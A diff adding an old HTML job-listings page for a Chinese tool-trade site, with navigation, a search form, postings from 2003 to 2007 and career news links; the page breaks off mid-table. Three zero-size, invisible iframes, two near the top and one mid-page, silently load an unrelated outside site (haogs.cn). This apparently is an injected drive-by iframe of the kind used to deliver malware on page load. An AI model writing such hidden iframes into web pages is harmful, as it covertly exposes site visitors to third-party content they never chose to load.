@@ -1,0 +1,932 @@
+
+
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+
+
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+
+
+
+<head>
+<title>哈川工具网·人才市场</title>
+<script language="JavaScript">
+function bookmarkit(){window.external.addFavorite('http://http://www.hctool.com.cn','哈川工具网')}
+</script>
+<SCRIPT>
+function viewa(url){ 
+var url; window.open(url,'_blank','status=no,scrollbars=yes,top=20,left=100,width=575,height=240'); 
+}
+</SCRIPT>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<LINK 
+href="image/main.css" rel=stylesheet type=text/css>
+<META content="Microsoft FrontPage 4.0" name=GENERATOR>
+</head>
+<BODY text=#000000 leftMargin=0 topMargin=0 
+marginheight="0" marginwidth="0"> 
+<CENTER>
+<TABLE border=0 cellPadding=0 
+cellSpacing=0 height=58 width=750 style="border-collapse: collapse" bordercolor="#111111">
+<TBODY>
+<TR>
+<TD align=middle width=760>
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="82">
+<tr>
+<TD align=middle 
+width=750 height="1" colspan="3">
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" background="../hyxx/images/index_1x.gif" height="1">
+<tr>
+<TD class=M height=12 background="../hyxx/images/index_1x.gif"></TD>
+</tr>
+</table>
+</TD>
+</tr>
+<tr>
+<TD align=middle 
+width=170 height="72">
+<a target="_top" href="http://http://www.hctool.com.cn">
+<img border="0" src="../images/zyoklogo.gif"></a></TD>
+<TD align=middle width=490 height="72">
+<iframe src="../adshj/Ad.asp" width=481 height=62 border=0 frameborder=0 framespacing=0 marginheight=1 marginwidth=1 noResize scrolling=no vspace="0" name="I1"></iframe>
+</TD>
+<TD vAlign=middle width=90 height="72">
+<div align="center">
+<center>
+<table border="0" style="border-collapse: collapse" bordercolor="#111111" width="81" id="AutoNumber2" cellspacing="1">
+<tr>
+<td width="17%">
+<img border="0" src="../images/newmiddle-arrow1.gif"><span lang="zh-cn">
+</span></td>
+<td width="83%">
+<a onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://http://www.hctool.com.cn');" target="_top" href="http://http://www.hctool.com.cn">
+<font color="#000080">设为首页</font></a></td>
+</tr>
+<tr>
+<td width="17%">
+<img border="0" src="../images/newmiddle-arrow1.gif"><span lang="zh-cn">
+</span></td>
+<td width="83%">
+<a onclick="javascript:window.external.addFavorite('http://http://www.hctool.com.cn','哈川工具网');" target="_top" href="http://http://www.hctool.com.cn">
+<font color="#000080">加入收藏</font></a></td>
+</tr>
+<tr>
+<td width="17%">
+<img border="0" src="../images/newmiddle-arrow1.gif"><span lang="zh-cn">
+</span></td>
+<td width="83%"><span lang="zh-cn">
+<a target="_blank" href="../khfk/default.asp">
+<font color="#000080">在线咨询</font></a><font color="#000080">
+</font> </span></td>
+</tr>
+</table>
+</center>
+</div>
+</TD>
+</tr>
+<tr>
+<TD align=middle 
+width=750 height="5" colspan="3">
+<p align="left"></TD>
+</tr>
+</table>
+</TD>
+</TR></TBODY></TABLE>
+</CENTER>
+<div align="center">
+<center>
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="750" id="AutoNumber7">
+<tr>
+<td width="100%">
+<TABLE border=0 cellPadding=0 cellSpacing=0 width=750>
+<TBODY>
+<TR>
+<TD vAlign=top width="720">
+<TABLE border=0 cellPadding=0 cellSpacing=0 height=24>
+<TBODY>
+<TR>
+<TD width=6><IMG height=1 src="" width=1></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj01.gif 
+class=LL vAlign=bottom width=48><FONT class=LL color=#ffffff>
+<a style="text-decoration: none" target="_top" href="../default.asp">
+<font color="#000000">首页</font></a></FONT></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../Syjh/default.asp">
+<font color="#000000">贸易机会</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../spzs/default.asp">
+<font color="#000000">产品展示</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../qyml/default.asp">
+<font color="#000000">企业名录</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../hyxx/default.asp">
+<font color="#000000">行业信息</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj02.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="default.asp">
+<font color="#FFFFFF">人才市场</font></a></TD>
+<TD align=middle background=image/CreditDynamic_index_bj03.gif class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../qyfw/default.asp">
+<font color="#000000">商务服务</font></a></TD>
+<TD align=middle background=image/CreditDynamic_index_bj03.gif class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../ershou/index.asp">
+<font color="#000000">二手市场</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<a style="text-decoration: none" target="_top" href="../wlyx/default.asp">
+<font color="#000000">网络营销</font></a></TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<p align="center">
+<a style="text-decoration: none" href="../shop/bbs/index.asp" target="_blank"><font color="#000000">BBS</font></a></p>
+</TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj03.gif 
+class=LL vAlign=bottom width=61>
+<p align="center">
+<a style="text-decoration: none" href="../shop/" target="_blank"><font color="#000000">网上商城</font></a></p>
+</TD>
+<TD align=middle 
+background=image/CreditDynamic_index_bj04.gif 
+class=LL vAlign=bottom width=73>
+<table border="0" cellpadding="0" cellspacing="1" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8">
+<tr>
+<td width="25%">
+<p align="right">
+<img border="0" src="../hyxx/images/userlist.gif"></td>
+<td width="70%">
+<FONT 
+color=#AD3501>
+<a style="text-decoration: none" target="_top" href="../manage/index.asp">
+<font color="#800000">会员助手</font></a></FONT></td>
+</tr>
+</table>
+</TD></TR></TBODY></TABLE></TD>
+</TR>
+<TR>
+<TD background=image/CreditDynamic_index_bj05.gif 
+height=29 width="750" colspan="2">
+<TABLE border=0 cellPadding=0 cellSpacing=0 width=590>
+<TBODY>
+<TR>
+<TD width=180>
+<IMG 
+src="image/CreditDynamic_index_02.gif"></TD>
+<TD width=70>
+<DIV align=center>
+<a style="text-decoration: none" target="_blank" href="../newsmore.asp?bz=8">
+<font color="#FFFFFF">人才动态</font></a></DIV></TD>
+<TD><IMG 
+src="image/CreditDynamic_index_01.gif"></TD>
+<TD width=92>
+<DIV align=center>
+<a style="text-decoration: none" target="_top" href="new_info.asp"><font color="#FFFFFF">今日最新招聘</font></a></DIV></TD>
+<TD><IMG 
+src="image/CreditDynamic_index_01.gif"></TD>
+<TD width=70>
+<DIV align=center>
+<a target="_top" href="psearch.asp">
+<font color="#FFFFFF">最新求职</font></a></DIV></TD>
+<TD><IMG 
+src="image/CreditDynamic_index_01.gif"></TD>
+<TD width=70>
+<DIV align=center>
+<a target="_top" href="company_job.asp">
+<font color="#FFFFFF">发布招聘</font></a></DIV></TD>
+<TD><IMG 
+src="image/CreditDynamic_index_01.gif"></TD>
+<TD width=70>
+<DIV align=center>
+<b>
+<a target="_top" href="person_info.asp">
+<font color="#FFFF00">发布求职</font></a></b></DIV></TD>
+<TD><IMG 
+src="image/CreditDynamic_index_01.gif"></TD>
+<TD width=70>
+<DIV align=center>
+<a target="_top" href="../help/job_help.asp">
+<font color="#FFFFFF">人才指南</font></a></DIV></TD>
+</TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD width="750" colspan="2">
+<IMG 
+src="image/CreditDynamic_index_top_dt0.gif"></TD></TR></TBODY></TABLE>
+</td>
+</tr>
+</table>
+</center>
+</div>
+
+
+
+
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+
+
+<SCRIPT>
+function view1(url){ 
+var url; window.open(url,'_blank','status=no,scrollbars=yes,top=20,left=110,width=600,height=460'); 
+}
+</SCRIPT>
+<script language="javascript">
+function job(mylink)
+{
+window.open(mylink,'','top=50,left=120,width=457,height=450,scrollbars=yes')
+}
+</script>
+<script language="javascript">
+function person(link)
+{
+window.open(link,'','top=10,left=65,width=650,height=480,scrollbars=yes')
+}
+</script>
+
+<HTML><HEAD><TITLE>哈川工具网·人才市场</TITLE>
+<META content=zh-cn http-equiv=Content-Language>
+<META content="text/html; charset=gb2312" http-equiv=Content-Type>
+<LINK 
+href="image/main.css" rel=stylesheet type=text/css>
+<style>
+<!--
+.navtext1 {
+FILTER: dropshadow(color=#FCDDAB,offx=1,offy=1); FONT-SIZE: 12px
+}
+TABLE {
+FONT-SIZE: 9pt
+}
+-->
+</style>
+</HEAD>
+<BODY bgColor=#ffffff text=#000000 topMargin=0 marginheight="0">
+<CENTER>
+<TABLE border=0 cellPadding=0 cellSpacing=0 width=750>
+<TBODY>
+<TR>
+<TD height=7 width=552></TD>
+<TD height=7 width=8></TD>
+<TD height=7 width=190></TD></TR>
+<TR>
+<TD vAlign=top width="552">
+<FORM action=select.asp id=f method=POST name="search">
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="100%">
+<TBODY>
+<TR>
+<TD background=image/CreditDynamic_index_bj06.gif 
+height=37>
+<DIV align=center class=LL>
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="100%">
+<TBODY>
+<TR>
+<TD width="90%">
+<DIV align=right><FONT color=#3366cc><span class="M">人才市场查询</span>：</FONT> <font color="#FFFF00">      
+<input type="text" name="txtitle" size="20"></font> <font color="#FFFFFF">      
+<INPUT name=IndexArea 
+type=radio value="job" checked></font>企业招聘      
+<font color="#FFFFFF">
+<INPUT name=IndexArea type=radio 
+value="person"></font>人才求职<font color="#FFFFFF">&nbsp;</font><SELECT 
+name=sf> 
+<OPTION 
+selected value="0">所有区域</OPTION> 
+<OPTION value=浙江>浙江</OPTION> 
+<OPTION value=安徽>安徽</OPTION> 
+<OPTION value=北京>北京</OPTION> 
+<OPTION 
+value=重庆>重庆</OPTION> <OPTION value=福建>福建</OPTION> 
+<OPTION value=甘肃>甘肃</OPTION> 
+<OPTION 
+value=广东>广东</OPTION> <OPTION value=广西>广西</OPTION> 
+<OPTION value=贵州>贵州</OPTION> 
+<OPTION 
+value=海南>海南</OPTION> <OPTION value=河北>河北</OPTION> 
+<OPTION value=黑龙江>黑龙江</OPTION> 
+<OPTION 
+value=哈川工具网>哈川工具网</OPTION> <OPTION value=湖北>湖北</OPTION> 
+<OPTION value=湖南>湖南</OPTION> 
+<OPTION 
+value=内蒙古>内蒙古</OPTION> <OPTION value=江苏>江苏</OPTION> 
+<OPTION value=江西>江西</OPTION> 
+<OPTION 
+value=吉林>吉林</OPTION> <OPTION value=辽宁>辽宁</OPTION> 
+<OPTION value=宁夏>宁夏</OPTION> 
+<OPTION 
+value=青海>青海</OPTION> <OPTION value=山西>山西</OPTION> 
+<OPTION value=陕西>陕西</OPTION> 
+<OPTION 
+value=山东>山东</OPTION> <OPTION value=上海>上海</OPTION> 
+<OPTION value=四川>四川</OPTION> 
+<OPTION 
+value=天津>天津</OPTION> <OPTION value=西藏>西藏</OPTION> 
+<OPTION value=新疆>新疆</OPTION> 
+<OPTION 
+value=云南>云南</OPTION> 
+<OPTION value=香港>香港</OPTION> 
+<OPTION 
+value=澳门>澳门</OPTION> <OPTION value=台湾>台湾</OPTION> 
+</SELECT></DIV></TD>
+<TD width="20%">&nbsp;<INPUT align=bottom border=0 
+name=I7 src="image/CreditDynamic_index_search.gif" type=image ></TD></TR></TBODY></TABLE></DIV></TD></TR>
+<TR>
+<TD>　</TD></TR>
+<TR>
+<TD>
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+<tr>
+<td width="100%">
+<TABLE border=0 cellPadding=0 cellSpacing=0 
+width=552 style="border-collapse: collapse" bordercolor="#111111" bgcolor="#F4FBFF">
+<TBODY>
+<TR>
+<TD colSpan=3 style="font-family: 宋体; font-size: 12px">
+<img border="0" src="image/j5.gif"></TD></TR>
+<TR>
+<TD bgColor=#67A2E3 width=1 style="font-family: 宋体; font-size: 12px"></TD>
+<TD vAlign=top width=550 style="font-family: 宋体; font-size: 12px">
+<div align="center">
+<center>
+<table border="0" cellspacing="1" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber5" height="458">
+<tr>
+<td width="100%" height="319" valign="top">
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6">
+<tr>
+<TD vAlign=top width="100%"><!--招聘特区开始-->
+<TABLE border=0 cellPadding=0 cellSpacing=2 class=lh-15 
+width="100%" style="border-collapse: collapse" bordercolor="#111111" height="28">
+<TBODY>
+<TR>
+<TD width="50%" height="26">
+<img border="0" src="image/a-zptq.gif"></TD>
+<TD align=middle width="50%" height="26">
+<a href="jobsearch.asp">更多招聘... </a> </TD></TR></TBODY></TABLE>
+<!--招聘特区结束--></TD>
+</tr>
+<tr>
+<td width="100%">
+<div align="right">
+<table border="0" cellspacing="1" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber7" cellpadding="3">
+<tr>
+<TD width="4%">　</TD>
+<TD width="35%">　</TD>
+<TD width="44%">　</TD>
+<TD width="20%">　</TD>
+</tr>
+<tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=46&quot;)">
+招聘文员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.hctools.com.cn target="_blank">上海哈川工具有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2007-3-22</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=45&quot;)">
+招收普工!</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.hctools.com.cn target="_blank">哈川工具有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2006-8-14</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=44&quot;)">
+商务网招聘销售专员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.jp17.com target="_blank">东莞市嘉品仪器有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-26</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=43&quot;)">
+嘉品仪器招聘商务精英</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.jp17.com target="_blank">嘉品仪器 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-24</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=42&quot;)">
+MUC</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://WWW.DCT4.COM target="_blank">INSTANT 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-28</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=41&quot;)">
+程序员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.1ben.net target="_blank">一本科技开发有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-26</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=40&quot;)">
+招聘销售人员 </a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.gobon.com target="_blank">国邦在线 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-28</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=39&quot;)">
+文秘</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=正百建设中 target="_blank">慧鹰集团股份有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-28</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=38&quot;)">
+销售人员/助理</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=正百建设中 target="_blank">慧鹰集团股份有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-26</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=37&quot;)">
+丝网印刷厂业务</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.dameiprinting.com target="_blank">达美特殊印刷厂 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2004-12-28</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=36&quot;)">
+丝网印刷厂业务经理</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.dameiprinting.com target="_blank">达美特殊印刷厂 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-17</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=35&quot;)">
+丝网印刷工</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.dameiprinting.com target="_blank">达美特殊印刷厂 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-17</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=34&quot;)">
+普光网络兼职——足不出户..</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www1.ggzz.com/soho/?mid=shirly_723_1984 target="_blank">普光网络公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-16</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=33&quot;)">
+诚聘结构设计师，电气工程..</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.chinarobust.com target="_blank">宁波乐邦电气有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-15</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=32&quot;)">
+招聘外汇经纪人</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+<a target="_blank" href="../company/index.asp?id=">CCH 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-15</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=31&quot;)">
+招聘销售人员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.gobon.com target="_blank">国邦在线 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-12</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=30&quot;)">
+招计算机程序员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+<a target="_blank" href="../company/index.asp?id=">电脑公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-8</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=29&quot;)">
+项目助理</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.market-exp.com target="_blank">明略市场策划（上海）有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-1</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=28&quot;)">
+行政助理</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.market-exp.com target="_blank">明略市场策划（上海）有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-6-1</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=27&quot;)">
+机械工程师</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+</a>
+<a href=http://www.shurong.com target="_blank">温州市曙光起动设备有限公司 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-5-27</span></TD>
+</tr>
+ 
+<TD width="4%">
+<p align="center"><img border="0" src="image/dot.gif"></TD>
+<TD width="35%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+<a href="javascript:job(&quot;job_info.asp?info_id=26&quot;)">
+茶馆服务员</a></span></TD>
+<TD width="44%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+
+<a target="_blank" href="../company/index.asp?id=">合资企业 
+</a></span></TD>
+<TD width="20%"> 
+<span style=\&quot;font-size:9pt;line-height: 15pt\">
+2003-5-20</span></TD>
+</tr>
+ 
+</table>
+</div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</center>
+</div>
+</TD>
+<TD bgColor=#67A2E3 width=1 style="font-family: 宋体; font-size: 12px"></TD></TR>
+<TR>
+<TD colSpan=3 style="font-family: 宋体; font-size: 12px">
+<img border="0" src="image/j6.gif"></TD></TR></TBODY></TABLE></td>
+</tr>
+</table>
+</TD></TR></TBODY></TABLE></FORM>
+</TD>
+<TD width="8">　</TD>
+<TD vAlign=top width="190">
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="100%">
+<TBODY>
+<TR>
+<TD><map name="FPMap0">
+<area href="job_edit.asp" shape="rect" coords="7, 7, 97, 52">
+<area coords="99, 7, 185, 51" shape="rect" href="person_login.asp">
+</map><img border="0" src="image/job2.gif" usemap="#FPMap0"></TD></TR>
+<TR>
+<TD>　</TD></TR></TBODY></TABLE>
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="100%">
+<TBODY>
+<TR>
+<TD width="190" height="26" background="image/j10.gif">
+&nbsp; <span style="letter-spacing: 1"><font color="#FFFFFF">   
+<span style="font-size: 10.5pt"><b>市场动态</b></span></font></span></TD></TR>
+<TR>
+<TD 
+background=image/CreditDynamic_index_bj11.gif>
+<DIV align=center>
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="95%" height="50">
+<TBODY>
+<TR>
+<TD height=12></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=96')">员工租赁在国内悄然兴起</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=95')">对口招生及专升本体音美专业</a></span><a href="javascript:view('show_news.asp?newsid=95')"><span style="\&quot;font-size:9pt;line-height:; letter-spacing:-3">..</span><span style=\&quot;font-size:9pt;line-height: 15pt\"></span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=94')">秘书职业资格考试今年的改革</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=93')">CIA--国际注册内部审计师</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=92')">什么是国际护士认证考试</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=91')">知识型员工的六般武艺</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=90')">令你脱颖而出的秘诀</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=88')">面试时别这样说话</span></a></TD></TR>
+ 
+<TR>
+<TD height=20>·<span style=\&quot;font-size:9pt;line-height: 15pt\"><a href="javascript:view1('../show_news.asp?newsid=87')">克服面试怯场十招</span></a></TD></TR>
+
+<TR>
+<TD height=18>
+<DIV align=right><B>
+<a href="../newsmore.asp?bz=8"><FONT 
+color=#ff6600>&gt;&gt;&gt;更多</FONT></a></B><FONT 
+color=#ff6600><B>&nbsp;</B></FONT></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR>
+<TR>
+<TD bgColor=#527dce height=1></TD></TR></TBODY></TABLE>
+<TABLE border=0 cellPadding=0 cellSpacing=0 width="100%" style="border-collapse: collapse" bordercolor="#111111">
+<TBODY>
+<TR>
+<TD>　</TD></TR>
+<TR>
+<TD width="190" height="26" background="image/j11.gif">
+&nbsp; <span style="letter-spacing: 1"><font color="#FFFFFF">   
